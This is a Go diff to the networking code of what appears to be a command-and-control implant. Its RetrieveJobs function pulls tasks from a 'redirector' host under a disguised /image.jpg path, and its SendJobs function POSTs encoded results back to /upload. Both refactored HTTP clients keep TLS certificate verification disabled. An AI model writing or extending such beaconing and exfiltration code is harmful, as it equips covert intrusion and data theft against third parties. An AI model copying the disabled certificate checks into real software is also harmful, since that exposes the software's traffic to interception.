@@ -71,9 +71,28 @@ func RetrieveJobs(redirector string,authentication string) ([]byte,string){
 	if result != "Good"{
 		return newJobs,result
 	}
-	//Bypass unsecure self-signed certificate
-	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
-	client := &http.Client{}
+	
+	//HTTP Clients Conf
+	client := &http.Client{
+		Transport: &http.Transport{
+        	DialContext:(&net.Dialer{
+            	Timeout:   10 * time.Second,
+            	KeepAlive: 10 * time.Second,
+        	}).DialContext,
+
+        	//Skip TLS Verify since we are using self signed Certs
+        	TLSClientConfig:(&tls.Config{
+            	InsecureSkipVerify: true,
+        	}),
+
+        	TLSHandshakeTimeout:   20 * time.Second,   
+        	ExpectContinueTimeout: 10 * time.Second,
+        	ResponseHeaderTimeout: 10 * time.Second,	
+		},
+
+		Timeout: 30 * time.Second,
+	}
+	
 	req, _ := http.NewRequest("GET", "https://"+redirector+"/image.jpg", nil)
 	req.Header.Set("Authorization", authentication)
 	res, err := client.Do(req)
@@ -104,9 +123,28 @@ func SendJobs(redirector string,authentication string,encodedJob []byte) string{
 	if result != "Good"{
 		return result
 	}
-	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+
+	//HTTP Clients Conf
+	client := &http.Client{
+		Transport: &http.Transport{
+        	DialContext:(&net.Dialer{
+            	Timeout:   10 * time.Second,
+            	KeepAlive: 10 * time.Second,
+        	}).DialContext,
+
+        	//Skip TLS Verify since we are using self signed Certs
+        	TLSClientConfig:(&tls.Config{
+            	InsecureSkipVerify: true,
+        	}),
+
+        	TLSHandshakeTimeout:   10 * time.Second,   
+        	ExpectContinueTimeout: 4 * time.Second,
+        	ResponseHeaderTimeout: 3 * time.Second,	
+		},
+
+		Timeout: 20 * time.Second,
+	}
 	
-	client := &http.Client{}
 	req, _ := http.NewRequest("POST", "https://"+redirector+"/upload",bytes.NewBuffer(encodedJob))
 	req.Header.Set("Authorization", authentication)
 	
@@ -115,7 +153,6 @@ func SendJobs(redirector string,authentication string,encodedJob []byte) string{
 		error = "Connection error with redirector "+redirector+":"+err.Error()
 		return error
 	}
-
 
 	//Debug: Post Request
 	/*
